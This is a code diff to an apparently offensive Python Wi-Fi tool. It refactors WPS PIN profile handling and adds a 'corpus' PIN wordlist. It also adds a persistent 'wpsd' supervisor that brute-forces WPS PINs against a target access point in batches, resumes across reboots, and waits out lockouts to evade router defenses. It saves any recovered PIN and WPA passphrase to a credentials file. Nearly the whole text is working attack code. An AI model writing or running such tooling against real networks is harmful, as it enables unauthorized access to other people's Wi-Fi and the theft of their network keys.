@@ -170,16 +170,9 @@ def cmd_wps(a):
     log = _logger(a.out)
     if not _require_root(log):
         return 1
-    pins = []
-    for prof in (a.profile or "extended").split(","):
-        prof = prof.strip()
-        if prof.startswith("pins:"):
-            pins += [p.strip() for p in prof[5:].split(",") if p.strip()]
-        elif prof in wps_attack.PROFILES:
-            pins += wps_attack.PROFILES[prof]
-        else:
-            log(f"[!] unknown profile '{prof}' (have: {sorted(wps_attack.PROFILES)})")
-            return 2
+    pins = _resolve_pins(log, a.profile or "extended")
+    if pins is None:
+        return 2
     res = wps_attack.sweep(a.bssid, a.ssid, pins, a.out, log, wait_s=a.wait)
     if res.get("pin"):
         write_creds(a.out, a.ssid, f"WPS-PIN-{res['pin']} / PSK={res.get('psk')}")
@@ -187,6 +180,108 @@ def cmd_wps(a):
         return 0
     log(f"[DONE] WPS no hit: {res}")
     return 1 if res.get("reason") != "locked" else 3
+
+
+def _resolve_pins(log, spec):
+    pins = []
+    for prof in spec.split(","):
+        prof = prof.strip()
+        if prof.startswith("pins:"):
+            pins += [p.strip() for p in prof[5:].split(",") if p.strip()]
+        elif prof == "corpus":
+            pins += wordlists.wps_pin_candidates()
+        elif prof in wps_attack.PROFILES:
+            pins += wps_attack.PROFILES[prof]
+        else:
+            log(f"[!] unknown profile '{prof}' (have: {sorted(wps_attack.PROFILES) + ['corpus']})")
+            return None
+    return pins
+
+
+def _other_sweep_active(outdir):
+    """Refuse to start if a DIFFERENT sweep dir has a fresh wps.log (one radio)."""
+    repo = os.path.dirname(os.path.abspath(outdir))
+    if os.path.basename(repo).startswith("results"):
+        repo = os.path.dirname(repo)
+    try:
+        names = os.listdir(repo)
+    except Exception:
+        return None
+    for nm in names:
+        if not nm.startswith("results-"):
+            continue
+        if os.path.abspath(os.path.join(repo, nm)) == os.path.abspath(outdir):
+            continue
+        log = os.path.join(repo, nm, "wps.log")
+        try:
+            if os.path.isfile(log) and time.time() - os.path.getmtime(log) < 120:
+                return nm
+        except Exception:
+            pass
+    return None
+
+
+def cmd_wpsd(a):
+    """Persistent WPS supervisor: batches through the corpus forever-ish.
+
+    - resumes from OUT/done.log (pins, one per line) incl. across reboots
+    - optional --seed-file pre-fills done on first start (already-tried PINs)
+    - lockout -> sleep --lockout-sleep and retry; success/exhausted -> exit 0
+    - refuses to start while another sweep is active (single radio)
+    """
+    from .radio import wlan0_healthy
+    log = _logger(a.out)
+    if not _require_root(log):
+        return 1
+    busy = _other_sweep_active(a.out)
+    if busy:
+        log(f"[!] another sweep active ({busy}) - refusing (single radio)")
+        return 2
+    pins = _resolve_pins(log, a.pins)
+    if pins is None:
+        return 2
+    done_path = os.path.join(a.out, "done.log")
+    if not os.path.isfile(done_path) and a.seed_file and os.path.isfile(a.seed_file):
+        with open(a.seed_file, errors="ignore") as f:
+            seed = [ln.strip() for ln in f if ln.strip()]
+        with open(done_path, "w") as f:
+            f.write("\n".join(seed) + ("\n" if seed else ""))
+        log(f"[*] seeded {len(seed)} already-tried PINs")
+    with open(os.path.join(a.out, "wps.log"), "a", buffering=1) as wlog:
+        def both(msg):
+            line = f"{datetime.datetime.now().isoformat(timespec='seconds')} {msg}"
+            print(line, flush=True)
+            wlog.write(line + "\n")
+        both(f"[*] wpsd persistent sweep vs {a.ssid} ({a.bssid}), {len(pins)} PINs in corpus")
+        while True:
+            try:
+                with open(done_path, errors="ignore") as f:
+                    done = {ln.strip() for ln in f if ln.strip()}
+            except Exception:
+                done = set()
+            todo = [p for p in pins if p not in done]
+            if not todo:
+                both("[DONE] corpus exhausted, no hit. Stopping (no restart).")
+                return 0
+            batch, todo = todo[:a.batch], todo[a.batch:]
+            both(f"[*] batch: {len(batch)} PINs ({len(done)} done, {len(todo)} queued after)")
+            res = wps_attack.sweep(a.bssid, a.ssid, batch, a.out, both,
+                                   wait_s=a.wait, done=done, gap_s=a.gap)
+            with open(done_path, "a", buffering=1) as f:
+                for p in res.get("attempted_pins", []):
+                    f.write(p + "\n")
+                    done.add(p)
+            if res.get("pin"):
+                write_creds(a.out, a.ssid, f"WPS-PIN-{res['pin']} / PSK={res.get('psk')}")
+                both(f"[+] WPS SUCCESS PIN={res['pin']} PSK={res.get('psk')} IP={res.get('ip')}")
+                return 0
+            if res.get("reason") == "locked":
+                both(f"[*] AP locked - backing off {a.lockout_sleep}s")
+                time.sleep(a.lockout_sleep)
+                continue
+            if not wlan0_healthy():
+                both("[!] wlan0 disturbed - stopping (systemd will retry)")
+                return 1
 
 
 def cmd_dashboard(a):
@@ -215,6 +310,8 @@ def cmd_words(a):
             with open(path, errors="ignore") as f:
                 lists.append([ln.strip() for ln in f if ln.strip()])
         cands = wordlists.merge(*lists)
+    elif a.action == "wps-pins":
+        cands = wordlists.wps_pin_candidates()
     else:
         print(f"unknown words action: {a.action}")
         return 2
@@ -246,9 +343,22 @@ def build_parser():
     w.add_argument("--ssid", required=True)
     w.add_argument("--out", default="./results-wps")
     w.add_argument("--profile", default="extended",
-                   help="comma list of defaults,vendor,extended,all or pins:1,2,3")
+                   help="comma list of defaults,vendor,extended,all,corpus or pins:1,2,3")
     w.add_argument("--wait", type=int, default=config.WPS_WAIT_S)
     w.set_defaults(fn=cmd_wps)
+    sd = sub.add_parser("wpsd", help="persistent WPS supervisor (resume+lockout backoff)")
+    sd.add_argument("--bssid", required=True)
+    sd.add_argument("--ssid", required=True)
+    sd.add_argument("--out", default="./results-wps-persist")
+    sd.add_argument("--pins", default="corpus",
+                    help="comma list of defaults,vendor,extended,all,corpus or pins:1,2,3")
+    sd.add_argument("--seed-file", default="",
+                    help="pre-fill done.log with already-tried PINs on first start")
+    sd.add_argument("--batch", type=int, default=25)
+    sd.add_argument("--gap", type=int, default=10, help="quiet seconds between PINs")
+    sd.add_argument("--wait", type=int, default=config.WPS_WAIT_S)
+    sd.add_argument("--lockout-sleep", type=int, default=2700)
+    sd.set_defaults(fn=cmd_wpsd)
     d = sub.add_parser("dashboard", help="serve live web UI")
     d.add_argument("--port", type=int, default=8080)
     d.add_argument("--dir", default="./results-b1-48h")
@@ -259,7 +369,7 @@ def build_parser():
     m.add_argument("--time", type=int, default=2880)
     m.set_defaults(fn=cmd_migrate)
     g = sub.add_parser("words", help="build wordlists")
-    g.add_argument("action", choices=["hint", "mangle", "fetch", "merge"])
+    g.add_argument("action", choices=["hint", "mangle", "fetch", "merge", "wps-pins"])
     g.add_argument("--ssids", default="")
     g.add_argument("--url", default="")
     g.add_argument("--timeout", type=int, default=60)
